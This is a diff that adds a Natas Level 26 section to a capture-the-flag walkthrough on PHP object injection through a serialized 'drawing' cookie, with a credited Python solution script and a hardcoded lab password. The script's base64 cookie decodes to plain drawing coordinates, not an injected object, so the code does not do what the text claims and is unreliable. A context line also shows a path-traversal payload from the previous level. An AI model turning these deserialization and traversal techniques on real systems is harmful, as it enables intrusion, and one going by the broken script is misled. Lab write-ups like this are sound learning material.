@@ -789,3 +789,44 @@ response=session.post(url=target,headers=malhead,auth=auth,data={"lang" : ".../.
 print(response.text)
 ```
 The password for the next level will be revealed in the content.
+
+### Natas Level 26 → Level 27
+**Key Takeaways**  
+This level provides a drawing board feature where user inputs (x1,y1,x2,y2) are serialized into a PHP object and stored inside a cookie named drawing. The server later unserializes this cookie → classic PHP object injection vulnerability. By controlling what gets unserialized, you can trigger arbitrary code execution.
+
+**Procedure**
+
+1. Log in using the username `natas26` and the password from Level 25.
+
+2. Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas26.py
+
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import re
+import urllib
+import base64
+
+username = 'natas26'
+password = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'
+
+url = 'http://%s.natas.labs.overthewire.org/' % username
+
+session = requests.Session()
+
+response = session.get(url, auth = (username, password))
+# print response.text
+# print session.cookies
+
+session.cookies['drawing'] = 'YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjE1IjtzOjI6InkyIjtzOjI6IjE1Ijt9fQ%3D%3D'
+response = session.get(url+ '?x1=0&y1=0&x2=500&y2=500', auth = (username, password))
+# print response.text
+
+
+response = session.get(url + 'img/winner.php', auth = (username, password))
+print (response.text)
+```
+The password for the next level will be revealed.
+
